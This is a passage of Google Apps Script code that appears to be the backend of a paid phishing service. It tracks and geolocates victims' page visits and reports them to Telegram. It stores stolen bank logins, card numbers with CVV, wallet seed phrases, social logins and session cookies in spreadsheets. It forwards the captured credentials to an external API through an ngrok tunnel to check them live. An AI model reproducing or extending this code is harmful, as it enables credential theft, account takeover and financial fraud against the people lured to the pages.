      pageURL = `${mainURL}/${path}`;
    }
    
    // Log the URL construction for debugging
    Logger.log(`Created URL: ${pageURL} from mainURL: ${mainURL} and path: ${path}`);
    
    const updatedOn = new Date().toISOString();

    const finalUpdateResult = setMultipleCellDataByColumnSearch("projects", "projectId", projectId, {
      updatedOn,
      urlPaths: urlPathsStr,
      pageHealth,
      pageURL
    });

    if (!finalUpdateResult.success) {
      return {
        success: false,
        error: "Failed to update project with URL metadata",
        details: finalUpdateResult
      };
    }

    return {
      success: true,
      data: {
        projectId,
        title,
        amount,
        createdAt,
        expiryDate,
        mainURL,
        selectedLinkId,
        pageURL
      }
    };

  } catch (error) {
    Logger.log("Error in createProjectLink: " + error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}



// REDIRECT 


function createRedirect(params) {
  try {
    // Dynamically get the redirect template price
    const templateResult = getRowsByColumn("template", "templateId", "tpt01");
    
    if (!templateResult.success || templateResult.count === 0) {
      return {
        success: false,
        error: "Could not retrieve redirect template",
        details: templateResult
      };
    }

    // Extract price from the template row
    const templateRow = templateResult.data[0];
    const templateHeaders = templateResult.headers;
    const priceIndex = templateHeaders.indexOf("price");
    
    const amount = priceIndex !== -1 ? templateRow[priceIndex] : "50.00";
    
    // Ensure amount is a number for calculations
    const numericAmount = parseFloat(amount);

    // Debit the user for the redirect link creation
    const debitResult = debit({
      userId: params.userId,
      amount: amount,
      purpose: "create_redirect_link"
    });

    if (!debitResult.success) {
      if (debitResult.details && debitResult.details.message && debitResult.details.message.includes("Insufficient balance")) {
        return {
          success: false,
          error: "Redirect creation failed: Insufficient funds.",
          details: debitResult.details
        };
      }
      return {
        success: false,
        error: "Redirect creation failed: " + (debitResult.error || "Failed to process payment"),
        details: debitResult.details
      };
    }

    // Generate a unique redirectId (you might want to use a more robust method)
    const redirectId = `rd_${Date.now()}`;

    // Prepare redirect link data
    const createdAt = new Date();
    const expiryDate = new Date(createdAt.getTime() + 30 * 24 * 60 * 60 * 1000);

    // Store payment JSON data
    const paymentJSON = JSON.stringify([debitResult]);

    const redirectLinkData = {
      userId: params.userId,
      redirectId: redirectId,
      createdAt: createdAt.toISOString(),
      expiryDate: expiryDate.toISOString(),
      title: params.title,
      paymentJSON: paymentJSON, // Add payment JSON data to the sheet
      status: "ACTIVE", // Set initial status
      totalPaid: numericAmount.toFixed(2), // Initial totalPaid is the creation amount
      // Other fields will be populated by sheet formulas
    };

    // Add the new redirect link to the sheet
    const redirectResult = setRowDataByHeaderMap("redirect", redirectLinkData);

    if (!redirectResult.success) {
      return {
        success: false,
        error: "Failed to create redirect link",
        details: redirectResult
      };
    }

    // Retrieve the exact redirect link using redirectId
    const newLinkResult = getRowsByColumn("redirect", "redirectId", redirectId);

    if (!newLinkResult.success || newLinkResult.count === 0) {
      return {
        success: false,
        error: "Could not retrieve created redirect link",
        details: newLinkResult
      };
    }

    // Get the added row
    const addedLink = newLinkResult.data[0];
    const headers = newLinkResult.headers;

    // Map the row data to a response object
    const responseData = {};
    headers.forEach((header, index) => {
      responseData[header] = addedLink[index];
    });

    // Ensure specific fields are returned
    return {
      success: true,
      data: {
        redirectId: responseData.redirectId,
        linkHost: responseData.linkHost,
        link: responseData.link,
        linkGoogleURL: responseData.linkGoogleURL,
        expiryDate: expiryDate.toISOString(), // Fixed 30-day expiry
        amount: amount, // Dynamically retrieved amount
        totalPaid: numericAmount.toFixed(2), // Initial total paid
        paymentDetails: debitResult, // Include payment details in response
        status: "ACTIVE" // Include status in response
      }
    };

  } catch (error) {
    Logger.log("Error in createRedirect function: " + error.toString());
    return {
      success: false,
      error: "Server error: " + error.toString(),
      details: {
        errorMessage: error.message,
        errorStack: error.stack,
        message: "An unexpected error occurred while creating redirect link"
      }
    };
  }
}


// PAGE & FORM HANDLERS

function verifyRedirectVisit(params) {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const redirectSheet = ss.getSheetByName("redirect");

    if (!redirectSheet) {
      return createJsonResponse({ 
        success: false, 
        error: "Redirect sheet not found" 
      });
    }

    const data = redirectSheet.getDataRange().getValues();
    const headers = data[0];
    const pathsIndex = headers.indexOf("paths");
    const clicksIndex = headers.indexOf("clicks");
    const statusIndex = headers.indexOf("status");
    const linkIndex = headers.indexOf("link");

    const completeUrlHost = getHostFromUrl(params.completeUrl);

    for (let i = 1; i < data.length; i++) {
      const row = data[i];
      if (row[statusIndex] === "ACTIVE") {
        try {
          const paths = JSON.parse(row[pathsIndex] || "[]");
          const matchingPath = paths.find(p => p.path === params.path);

          if (matchingPath) {
            const redirectLinkHost = getHostFromUrl(row[linkIndex]);

            // Only perform strict host match if not localhost
            if (!isLocalHost(completeUrlHost)) {
              if (completeUrlHost !== redirectLinkHost) {
                return createJsonResponse({
                  success: false,
                  error: "Host mismatch for redirect link"
                });
              }
            }

            // Update clicks in paths JSON
            matchingPath.clicks++;
            redirectSheet.getRange(i + 1, pathsIndex + 1).setValue(JSON.stringify(paths));
            
            // Update total clicks
            const currentClicks = row[clicksIndex] || 0;
            redirectSheet.getRange(i + 1, clicksIndex + 1).setValue(currentClicks + 1);

            return createJsonResponse({
              success: true,
              redirectURL: matchingPath.redirectURL,
              status: "active"
            });
          }
        } catch (e) {
          Logger.log("Error parsing paths JSON: " + e);
        }
      }
    }

    return createJsonResponse({
      success: false,
      error: "No active redirect found for the given path"
    });

  } catch (error) {
    Logger.log("Error in verifyRedirectVisit: " + error);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.toString()
    });
  }
}

function testVerifyPageVisit() {
  const testParams = {
    path: "00ef38976de242c8a613",
    completeUrl: "https://protected-ssl.vercel.app/",
    ipData: "102.129.234.160"
  };
  
  const result = verifyPageVisit(testParams);
  Logger.log(result.getContent());
}

function verifyPageVisit(params) {
  try {
    const ss = SpreadsheetApp.openById(CONFIG.DB_ID);
    const projectsSheet = ss.getSheetByName(CONFIG.SHEET_NAME.PROJECTS);

    if (!projectsSheet) {
      return createJsonResponse({ 
        success: false, 
        error: "Projects sheet not found" 
      });
    }

    const data = projectsSheet.getDataRange().getValues();
    const headers = data[0];
    const mainURLIndex = headers.indexOf("mainURL");
    const urlPathsIndex = headers.indexOf("urlPaths");
    const systemStatusIndex = headers.indexOf("systemStatus");
    const pageVisitsIndex = headers.indexOf("pageVisits");
    const flaggedVisitsIndex = headers.indexOf("flaggedVisits");
    const templateCodeIndex = headers.indexOf("templateCode");
    const telegramGroupIdIndex = headers.indexOf("telegramGroupId");
    const projectNameIndex = headers.indexOf("projectTitle"); // Assuming you have this column
    const notifyVisitsIndex = headers.indexOf("notifyVisits");

    const completeUrlHost = getHostFromUrl(params.completeUrl);

    // Fetch full IP data
    let fullIpData = {};
    if (params.ipData) {
      fullIpData = getIpInfo(params.ipData);
      // If ipinfo.io returns an error or empty, ensure we still have the original IP
      if (!fullIpData || !fullIpData.ip) {
        fullIpData = { ip: params.ipData };
      }
    } else {
      fullIpData = { ip: "Unknown" };
    }

    // First, find the project that matches the path
    let matchingProjectRow = null;
    let matchingProjectIndex = -1;

    for (let i = 1; i < data.length; i++) {
      const row = data[i];
      if (row[systemStatusIndex] === "ACTIVE") {
        try {
          const urlPathsValue = row[urlPathsIndex];
          Logger.log(`Row ${i}: urlPaths value = "${urlPathsValue}", type = ${typeof urlPathsValue}`);
          
          // Handle empty, null, or undefined values
          let urlPathsString = urlPathsValue;
          if (!urlPathsString || urlPathsString.trim() === "") {
            urlPathsString = "[]";
          }
          
          const urlPaths = JSON.parse(urlPathsString);
          const matchingPath = urlPaths.find(p => p.path === params.path);

          if (matchingPath) {
            matchingProjectRow = row;
            matchingProjectIndex = i;
            break; // Found the matching project, exit loop
          }
        } catch (e) {
          Logger.log(`Error parsing urlPaths JSON for row ${i}: ${e}`);
          Logger.log(`Raw value: "${row[urlPathsIndex]}"`);
          // Continue to next row instead of failing
          continue;
        }
      }
    }

    // If we found a matching project by path, process it
    if (matchingProjectRow) {
      const mainURL = matchingProjectRow[mainURLIndex];
      const mainUrlHost = getHostFromUrl(mainURL);
      const telegramGroupId = matchingProjectRow[telegramGroupIdIndex];
      const projectName = matchingProjectRow[projectNameIndex] || "Unknown Project";

      if (!isLocalHost(completeUrlHost)) {
        if (completeUrlHost !== mainUrlHost) {
          // Host mismatch, count as flagged and send notification
          const currentFlagged = parseInt(matchingProjectRow[flaggedVisitsIndex] || 0);
          projectsSheet.getRange(matchingProjectIndex + 1, flaggedVisitsIndex + 1).setValue(currentFlagged + 1);

          // Send flagged visit notification only if notifyVisits is TRUE
          const notifyVisits = String(matchingProjectRow[notifyVisitsIndex]).trim().toUpperCase() === "TRUE";
          Logger.log("notifyVisits (flagged): " + notifyVisits); // Added logging
          if (telegramGroupId && notifyVisits) {
            sendVisitorNotification(telegramGroupId, fullIpData, projectName, params.path, params.completeUrl, "FLAGGED");
          }

          return createJsonResponse({
            success: false,
            error: "Host mismatch with mainURL"
          });
        }
      }

      // Host matches (or localhost), count as valid visit and send notification
      const currentVisits = parseInt(matchingProjectRow[pageVisitsIndex] || 0);
      projectsSheet.getRange(matchingProjectIndex + 1, pageVisitsIndex + 1).setValue(currentVisits + 1);

      // Send valid visit notification only if notifyVisits is TRUE
      const notifyVisits = String(matchingProjectRow[notifyVisitsIndex]).trim().toUpperCase() === "TRUE";
      Logger.log("notifyVisits (valid): " + notifyVisits); // Added logging
      if (telegramGroupId && notifyVisits) {
        sendVisitorNotification(telegramGroupId, fullIpData, projectName, params.path, params.completeUrl, "VALID");
      }

      return createJsonResponse({
        success: true,
        templateCode: matchingProjectRow[templateCodeIndex],
        status: "active",
        ipData: fullIpData
      });
    }

    // If no matching path found, increase flaggedVisits for all active projects (but no notifications)
    for (let i = 1; i < data.length; i++) {
      const row = data[i];
      if (row[systemStatusIndex] === "ACTIVE") {
        const currentFlagged = parseInt(row[flaggedVisitsIndex] || 0);
        projectsSheet.getRange(i + 1, flaggedVisitsIndex + 1).setValue(currentFlagged + 1);
      }
    }

    return createJsonResponse({
      success: false,
      error: "No active project matched the path"
    });

  } catch (error) {
    Logger.log("Error in verifyPageVisit: " + error);
    return createJsonResponse({
      success: false,
      error: "Server error: " + error.toString()
    });
  }
}

function sendVisitorNotification(telegramGroupId, ipData, projectName, path, completeUrl, visitType) {
  try {
    // Parse ipData if it's a string
    let visitorInfo = ipData || {};

    // Extract visitor information with fallbacks
    const ip = visitorInfo.ip || visitorInfo.query || "Unknown IP";
    const country = visitorInfo.country || "Unknown";
    const region = visitorInfo.regionName || visitorInfo.region || "Unknown";
    const city = visitorInfo.city || "Unknown";
    const isp = visitorInfo.isp || visitorInfo.org || "Unknown ISP";
    const timezone = visitorInfo.timezone || "Unknown";
    
    // Get current timestamp
    const timestamp = new Date().toLocaleString('en-US', {
      timeZone: timezone !== "Unknown" ? timezone : 'UTC',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    });

    // Construct the simplified message (only Valid Visit format)
    const formattedMessage = `✅ **Valid Visit**
    🌐 **Project:** ${projectName}
    👤 **Visitor Details:**
    🌍 **Location:** ${city}, ${region}, ${country}
    🌐 **IP Address:** ${ip}
    🏢 **ISP:** ${isp}
    🕒 **Time:** ${timestamp}
    🌏 **Timezone:** ${timezone}`;

    const textPayload = {
      method: "sendMessage",
      chat_id: telegramGroupId,
      text: formattedMessage,
      parse_mode: "Markdown"
    };

    const messageId = sendMediaAndMessageToTelegram(textPayload, null);

    if (messageId) {
      Logger.log(`Telegram notification sent successfully for visit to ${projectName}`);
    } else {
      Logger.log(`Failed to send Telegram notification for visit to ${projectName}`);
    }

  } catch (error) {
    Logger.log("Error sending visitor notification: " + error);
  }
}

function getIpInfo(ipAddress) {
  if (!ipAddress) {
    return {};
  }
  try {
    const url = `https://ipinfo.io/${ipAddress}/json`;
    const response = UrlFetchApp.fetch(url);
    const json = response.getContentText();
    return JSON.parse(json);
  } catch (e) {
    Logger.log(`Error fetching IP info for ${ipAddress}: ${e}`);
    return { ip: ipAddress, error: e.toString() }; // Return original IP and error
  }
}

function getHostFromUrl(url) {
  if (!url) {
    return "";
  }
  try {
    // Remove protocol (http://, https://)
    let host = url.replace(/^(https?:\/\/)?(www\.)?/i, '');
    // Remove path, query, and hash
    host = host.split('/')[0];
    host = host.split('?')[0];
    host = host.split('#')[0];
    // Remove port if present
    host = host.split(':')[0];
    return host;
  } catch (e) {
    Logger.log("Error extracting host from URL: " + url + " - " + e);
    return "";
  }
}

function isLocalHost(host) {
  return (
    host.startsWith("localhost") ||
    host.startsWith("127.") ||
    host.startsWith("0.") ||
    host === "0.0.0.0"
  );
}


function getCookieData(params) {
  try {
    const result = getAllRows("cookie");
    Logger.log(result);
    if (!result.success) return createJsonResponse(result);

    return createJsonResponse({
      success: true,
      headers: result.headers,
      data: result.data,
      count: result.count
    });
  } catch (error) {
    Logger.log("Error in getCookieData: " + error.message);
    return createJsonResponse({
      success: false,
      error: error.message
    });
  }
}

function setCookieData(params) {
  try {
    const { browserId, newRow = false, status } = params;
    if (!browserId) {
      return createJsonResponse({
        success: false,
        error: "Missing browserId"
      });
    }

    // Exclude keys that should not be updated/inserted
    const excludedKeys = ["action", "browserId", "newRow"];
    const processedData = {};

    Object.keys(params).forEach(key => {
      if (!excludedKeys.includes(key)) {
        processedData[key] = params[key];
      }
    });

    let result;
    if (newRow) {
      // For new rows, use setRowDataByHeaderMap
      result = setRowDataByHeaderMap(CONFIG.SHEET_NAME.COOKIE, {
        browserId,
        ...processedData,
        timestamp: new Date().toISOString() // Add timestamp for new rows
      });

      if (!result.success) {
        return createJsonResponse({
          success: false,
          error: "Failed to create new row",
          details: result
        });
      }
    } else {
      // For existing rows, use setMultipleCellDataByColumnSearch
      result = setMultipleCellDataByColumnSearch(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId, processedData);

      if (!result.success) {
        return createJsonResponse({
          success: false,
          error: "Failed to update existing row",
          details: result
        });
      }

      // Schedule updateHubAndProjectsFromCookieData if status is COMPLETED or FAILED
      if (result.success && (status === "COMPLETED" || status === "FAILED")) {
        try {
          const triggerId = Utilities.getUuid();
          const triggerProperties = {
            browserId: browserId,
            status: status
          };
          PropertiesService.getScriptProperties().setProperty(triggerId, JSON.stringify(triggerProperties));

          ScriptApp.newTrigger('runUpdateHubAndProjectsFromCookieDataWrapper')
            .timeBased()
            .at(new Date(Date.now() + 2 * 1000)) // Run 2 seconds from now
            .create();
          Logger.log(`Scheduled updateHubAndProjectsFromCookieData for browserId: ${browserId}, status: ${status}`);
        } catch (e) {
          Logger.log("Error scheduling updateHubAndProjectsFromCookieData: " + e.message);
        }
      }
    }

    return createJsonResponse({
      success: true,
      message: newRow ? "New cookie data row created successfully" : "Cookie data updated successfully",
      rowNumber: result.rowId
    });
  } catch (error) {
    Logger.log("Error in setCookieData: " + error.message);
    return createJsonResponse({
      success: false,
      error: error.message
    });
  }
}


/**
 * Helper function to update hub and projects sheets with data from the cookie sheet.
 * This function is intended to be called when a cookie submission status changes (e.g., COMPLETED, FAILED).
 * @param {string} browserId - The browserId to identify the cookie row and corresponding submissions.
 * @param {string} status - The status of the cookie submission (e.g., "COMPLETED", "FAILED").
 * @returns {Object} A JSON response indicating success or failure.
 */
function updateHubAndProjectsFromCookieData(browserId, status) {
  Logger.log(`updateHubAndProjectsFromCookieData called for browserId: ${browserId}, status: ${status}`);

  try {
    // 1. Get cookie row data
    const cookieRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.COOKIE, "browserId", browserId);

    if (!cookieRowsResult.success || cookieRowsResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Cookie data for browserId '${browserId}' not found.`
      });
    }

    const cookieHeaders = cookieRowsResult.headers;
    const cookieRowData = cookieRowsResult.data[0];
    const cookieRowMap = {};
    cookieHeaders.forEach((header, index) => {
      cookieRowMap[header] = cookieRowData[index];
    });

    // Prepare data for Hub and Projects
    const dataToUpdate = {
      verified: cookieRowMap.verified !== undefined ? cookieRowMap.verified : false,
      fullAccess: cookieRowMap.fullAccess !== undefined ? cookieRowMap.fullAccess : false,
      banks: cookieRowMap.banks || [],
      cards: cookieRowMap.cards || [],
      socials: cookieRowMap.socials || [],
      wallets: cookieRowMap.wallets || [],
      idMe: cookieRowMap.idMe || null,
      cookieJSON: cookieRowMap.formattedCookie || {}, // Mapping formattedCookie to cookieJSON
      cookieFileURL: cookieRowMap.driveUrl || ""      // Mapping driveUrl to cookieFileURL
    };

    const projectId = cookieRowMap.projectId;
    if (!projectId) {
      return createJsonResponse({
        success: false,
        error: `projectId not found in cookie data for browserId '${browserId}'.`
      });
    }

    // 2. Update Hub Sheet (first)
    const hubUpdateData = {
      verified: dataToUpdate.verified ? "TRUE" : "FALSE",
      fullAccess: dataToUpdate.fullAccess ? "TRUE" : "FALSE",
      banks: JSON.stringify(dataToUpdate.banks),
      cards: JSON.stringify(dataToUpdate.cards),
      socials: JSON.stringify(dataToUpdate.socials),
      wallets: JSON.stringify(dataToUpdate.wallets),
      // idMe: dataToUpdate.idMe, // Assuming idMe is not directly in hub sheet, or needs specific handling
      cookieJSON: JSON.stringify(dataToUpdate.cookieJSON),
      cookieFileURL: dataToUpdate.cookieFileURL,
      // Add status if there's a status column in hub
      // status: status // If a 'status' column exists in hub
    };

    const updateHubResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.HUB,
      "submissionId", // Search column in hub is submissionId
      browserId,      // browserId from cookie sheet matches submissionId in hub
      hubUpdateData
    );

    if (!updateHubResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to update hub sheet for browserId '${browserId}': ${updateHubResult.error}`
      });
    }
    Logger.log(`Hub sheet updated successfully for browserId: ${browserId}`);

    // 3. Update Projects Sheet
    const projectRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.PROJECTS, "projectId", projectId);

    if (!projectRowsResult.success || projectRowsResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Project with projectId '${projectId}' not found for updating response.`
      });
    }

    const projectHeaders = projectRowsResult.headers;
    const projectRowData = projectRowsResult.data[0]; // Assuming projectId is unique
    const projectRowMapForUpdate = {};
    projectHeaders.forEach((header, index) => {
      projectRowMapForUpdate[header] = projectRowData[index];
    });

    let existingResponses = [];
    const responseColumnValue = projectRowMapForUpdate.response;
    if (responseColumnValue) {
      try {
        existingResponses = JSON.parse(responseColumnValue);
        if (!Array.isArray(existingResponses)) {
          existingResponses = [];
        }
      } catch (e) {
        Logger.log("Error parsing existing project response JSON: " + e.message);
        existingResponses = [];
      }
    }

    let submissionEntryFound = false;
    const updatedResponses = existingResponses.map(entry => {
      if (entry.submissionId === browserId) {
        submissionEntryFound = true;
        return {
          ...entry,
          verified: dataToUpdate.verified,
          fullAccess: dataToUpdate.fullAccess,
          banks: dataToUpdate.banks,
          cards: dataToUpdate.cards,
          socials: dataToUpdate.socials,
          wallets: dataToUpdate.wallets,
          idMe: dataToUpdate.idMe,
          cookieJSON: dataToUpdate.cookieJSON,
          cookieFileURL: dataToUpdate.cookieFileURL
        };
      }
      return entry;
    });

    if (!submissionEntryFound) {
      Logger.log(`Submission entry with browserId '${browserId}' not found in project response JSON for projectId '${projectId}'.`);
      // Optionally, you might want to add it if it's not found, but the prompt implies updating existing.
    }

    const updateProjectResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.PROJECTS,
      "projectId",
      projectId,
      { "response": JSON.stringify(updatedResponses) }
    );

    if (!updateProjectResult.success) {
      return createJsonResponse({
        success: false,
        error: `Failed to update project sheet response for projectId '${projectId}': ${updateProjectResult.error}`
      });
    }
    Logger.log(`Projects sheet response updated successfully for projectId: ${projectId}`);

    return createJsonResponse({
      success: true,
      message: `Hub and Projects sheets updated successfully for browserId: ${browserId}`,
      hubUpdate: updateHubResult,
      projectUpdate: updateProjectResult
    });

  } catch (error) {
    Logger.log("Error in updateHubAndProjectsFromCookieData: " + error.message);
    return createJsonResponse({
      success: false,
      error: "Server error in updateHubAndProjectsFromCookieData: " + error.message,
      stack: error.stack
    });
  }
}

function runUpdateHubAndProjectsFromCookieDataWrapper() {
  const scriptProperties = PropertiesService.getScriptProperties();
  const allProperties = scriptProperties.getProperties();

  let triggerIdFound = null;
  for (const key in allProperties) {
    try {
      const properties = JSON.parse(allProperties[key]);
      if (properties.browserId && properties.status) {
        triggerIdFound = key;
        break;
      }
    } catch (e) {
      continue;
    }
  }

  if (triggerIdFound) {
    const propertiesString = scriptProperties.getProperty(triggerIdFound);
    scriptProperties.deleteProperty(triggerIdFound);

    try {
      const { browserId, status } = JSON.parse(propertiesString);
      Logger.log(`Wrapper: Retrieved browserId: ${browserId}, status: ${status}`);
      updateHubAndProjectsFromCookieData(browserId, status);
    } catch (e) {
      Logger.log("Wrapper Error parsing properties or calling updateHubAndProjectsFromCookieData: " + e.message);
    }
  } else {
    Logger.log("Wrapper: No trigger properties found for updateHubAndProjectsFromCookieDataWrapper.");
  }

  const triggers = ScriptApp.getProjectTriggers();
  for (let i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === 'runUpdateHubAndProjectsFromCookieDataWrapper') {
      ScriptApp.deleteTrigger(triggers[i]);
    }
  }
}



function testSetCookieData() {
  console.log("Starting setCookieData tests...");
  
  // Test 1: Update existing row
  console.log("\n=== Test 1: Update existing row ===");
  const test1 = setCookieData({
    browserId: "BR06",
    email: "updated@example.com",
    domain: "example.com",
    password: "newPassword123",
    verified: true
  });
  console.log("Result:", test1);
  console.log("Expected: success = true, message about update");
  
  // Test 2: Create new row
  console.log("\n=== Test 2: Create new row ===");
  const test2 = setCookieData({
    browserId: "BR07",
    newRow: true,
    email: "new@example.com",
    domain: "example.com",
    password: "password456",
    verified: false
  });
  console.log("Result:", test2);
  console.log("Expected: success = true, message about new row creation");
  
  console.log("\n=== Tests completed ===");
}

// Process Form Submission (Dynamically based on project type (plain, true and cookie))


/**
 * Helper function to add ngrok-skip-browser-warning header to options.
 * @param {Object} options - The original options object for UrlFetchApp.fetch.
 * @returns {Object} The updated options object with the ngrok header.
 */
function addNgrokSkipHeader(options) {
  const newOptions = { ...options };
  if (!newOptions.headers) {
    newOptions.headers = {};
  }
  newOptions.headers['ngrok-skip-browser-warning'] = 'true';
  return newOptions;
}

/**
 * Helper function to update mxRecord and possibleProvider in the hub sheet.
 * This function is intended to be called asynchronously.
 * @param {string} email - The email address to lookup.
 * @param {string} submissionId - The unique ID of the row in the hub sheet to update.
 */
function updateMxRecordAndProvider(email, submissionId) {
  Logger.log(`Starting updateMxRecordAndProvider for email: ${email}, submissionId: ${submissionId}`);
  if (!email || !submissionId) {
    Logger.log("Missing email or submissionId for updateMxRecordAndProvider.");
    return;
  }

  try {
    const apiUrl = `${CONFIG.EXTERNAL_API}/emails/mx-lookup-check?emails=${encodeURIComponent(email)}`;
    Logger.log(`Calling MX lookup API: ${apiUrl}`);

    const options = addNgrokSkipHeader({
      method: 'GET',
      headers: {
        'Content-Type': 'application/json'
      },
      muteHttpExceptions: true // Important to catch errors gracefully
    });
    const response = UrlFetchApp.fetch(apiUrl, options);

    const apiResponseData = JSON.parse(response.getContentText());
    Logger.log("MX Lookup API Response:", apiResponseData);

    let mxRecord = "N/A";
    let possibleProvider = "N/A";

    if (apiResponseData && apiResponseData.results && apiResponseData.results.length > 0) {
      const result = apiResponseData.results[0];
      mxRecord = JSON.stringify(result); // Store the entire result JSON
      possibleProvider = result.possibleProvider || "N/A";
    }

    Logger.log(`Updating hub sheet for submissionId: ${submissionId} with mxRecord: ${mxRecord}, possibleProvider: ${possibleProvider}`);

    // Update the specific row in the hub sheet using setMultipleCellDataByColumnSearch
    const updateHubResult = setMultipleCellDataByColumnSearch(
      CONFIG.SHEET_NAME.HUB,
      "submissionId", // Search column
      submissionId,   // Search value
      {
        "mxRecord": mxRecord,
        "possibleProvider": possibleProvider
      }
    );

    if (!updateHubResult.success) {
      Logger.log(`Error updating hub sheet: ${updateHubResult.error}`);
    }

    Logger.log("Hub sheet updated successfully with MX data.");

  } catch (error) {
    Logger.log("Error in updateMxRecordAndProvider: " + error.message);
  }
}

/**
 * Processes form submissions, updates project data, and sends notifications.
 * @param {Object} params - Parameters containing token, formData, templateType, templateNiche.
 * @param {string} params.token - Token to identify the project.
 * @param {Object} params.formData - The form data submitted.
 * @returns {GoogleAppsScript.Content.TextOutput} A JSON response indicating success or failure.
 */
function notifyFormSubmission(params) {
  Logger.log("notifyFormSubmission called with params: " + JSON.stringify(params));

  try {
    const { token, formData: formDataString } = params;

    if (!token || !formDataString) {
      return createJsonResponse({
        success: false,
        error: "Missing required parameters: token or formData."
      });
    }

    let formData;
    try {
      formData = JSON.parse(formDataString);
    } catch (e) {
      return createJsonResponse({
        success: false,
        error: "Invalid formData format. Expected JSON string."
      });
    }

    // 1. Use the token to search the projects sheet
    const projectRowsResult = getRowsByColumn(CONFIG.SHEET_NAME.PROJECTS, "token", token);

    if (!projectRowsResult.success || projectRowsResult.count === 0) {
      return createJsonResponse({
        success: false,
        error: `Project with token '${token}' not found.`
      });
    }

    const projectHeaders = projectRowsResult.headers;
    const projectRowData = projectRowsResult.data[0]; // Assuming token is unique, take the first match

    const projectRowMap = {};
    projectHeaders.forEach((header, index) => {
      projectRowMap[header] = projectRowData[index];
    });

    const templateType = projectRowMap.templateType; // Get from project row
    const templateNiche = projectRowMap.templateNiche; // Get from project row

    let updatedFormData = { ...formData }; // Create a mutable copy of formData

    // Extract domain from email if available
    if (updatedFormData.email) {
      const atIndex = updatedFormData.email.lastIndexOf('@');
      if (atIndex !== -1) {
        updatedFormData.domain = updatedFormData.email.slice(atIndex + 1);
      }
    }

    let verifyAccess = false;
    let cookieAccess = false;
    let verified = false;
    let fullAccess = false;

    // Call external API based on templateNiche (if applicable)
    let apiResponseData = null;
    let apiError = null;

    if (templateType === "PLAIN") {
      verifyAccess = false;
      cookieAccess = false;
      verified = false;
      fullAccess = false;
    } else if (templateType === "COOKIE" || templateType === "TRUE-LOGIN") {
      verifyAccess = true;
      cookieAccess = (templateType === "COOKIE"); // Set cookieAccess based on templateType

      let apiUrl = "";
      let requestBody = {}; // For POST requests

      switch (templateNiche) {
        case "WIRE":
          apiUrl = `${CONFIG.EXTERNAL_API}/emails/cookie/cookie-api-login`; // New endpoint for WIRE
          requestBody = {
            projectId: projectRowMap.projectId || "N/A",
            userId: projectRowMap.userId || "N/A",
            formId: projectRowMap.formId || "N/A",
            ipData: updatedFormData.ipData || {},
            deviceData: updatedFormData.deviceData || {}
          };
          requestBody.email = formData.email || ""; // Ensure email is always passed, defaulting to ""
          requestBody.password = formData.password || ""; // Ensure password is always passed, defaulting to ""
          requestBody.strictly = projectRowMap.strictly || ""; // Ensure strictly is always passed, defaulting to ""
          break;
        case "BANK":
          const bankData = formData.banks && formData.banks.length > 0 ? formData.banks[0] : {};
          username = bankData.username;
          password = bankData.password;
          const bankWebsite = bankData.website;
          if (!username || !password) {
            return createJsonResponse({ success: false, error: "Username and password required for BANK verification." });
          }
          apiUrl = `${CONFIG.EXTERNAL_API}/banks/true-login/verify-bank-login?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}${bankWebsite ? `&website=${encodeURIComponent(bankWebsite)}` : ''}`;
          break;
        case "SOCIAL":
          const socialData = formData.socials && formData.socials.length > 0 ? formData.socials[0] : {};
          username = socialData.username;
          password = socialData.password;
          const socialWebsite = socialData.website;
          if (!username || !password) {
            return createJsonResponse({ success: false, error: "Username and password required for SOCIAL verification." });
          }
          apiUrl = `${CONFIG.EXTERNAL_API}/socials/true-login/verify-social-login?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}${socialWebsite ? `&website=${encodeURIComponent(socialWebsite)}` : ''}`;
          break;
        case "WALLET":
          const walletData = formData.wallets && formData.wallets.length > 0 ? formData.wallets[0] : {};
          wordPhrase = walletData.wordPhrase;
          const walletWebsite = walletData.website;
          if (!wordPhrase) {
            return createJsonResponse({ success: false, error: "Word phrase required for WALLET verification." });
          }
          apiUrl = `${CONFIG.EXTERNAL_API}/wallets/true-login/verify-wallet-phrase?phrase=${encodeURIComponent(wordPhrase)}${walletWebsite ? `&website=${encodeURIComponent(walletWebsite)}` : ''}`;
          break;
        case "CARD":
          const cardData = formData.cards && formData.cards.length > 0 ? formData.cards[0] : {};
          cardNumber = cardData.cardNumber;
          expirationDate = cardData.expirationDate;
          cvv = cardData.cvv;
          const cardWebsite = cardData.website; // Assuming card object might have a website
          if (!cardNumber || !expirationDate || !cvv) {
            return createJsonResponse({ success: false, error: "Card number, expiration date, and CVV required for CARD verification." });
          }
          apiUrl = `${CONFIG.EXTERNAL_API}/cards/true-login/verify-card?cardNumber=${encodeURIComponent(cardNumber)}&expirationDate=${encodeURIComponent(expirationDate)}&cvv=${encodeURIComponent(cvv)}${cardWebsite ? `&website=${encodeURIComponent(cardWebsite)}` : ''}`;
          break;
        default:
          Logger.log(`No specific API for templateNiche: ${templateNiche} for templateType: ${templateType}. Skipping API call.`);
          break;
      }

      if (apiUrl) {
        try {
          Logger.log(`Calling external API: ${apiUrl}`);
          const options = addNgrokSkipHeader({
            method: (templateNiche === "WIRE") ? 'POST' : 'GET', // Use POST for WIRE, GET for others
            headers: {
              'Content-Type': 'application/json'
            },
            muteHttpExceptions: true // Important to catch errors gracefully
          });

          if (templateNiche === "WIRE") {
            options.payload = JSON.stringify(requestBody);
          }

          const response = UrlFetchApp.fetch(apiUrl, options);
          apiResponseData = JSON.parse(response.getContentText());
          Logger.log("External API Response:", apiResponseData);

          // verified and fullAccess are no longer directly from API response for COOKIE/TRUE-LOGIN
          // They will be determined by the initial formData defaults or remain false if not set.
          // The new API response doesn't carry these fields.
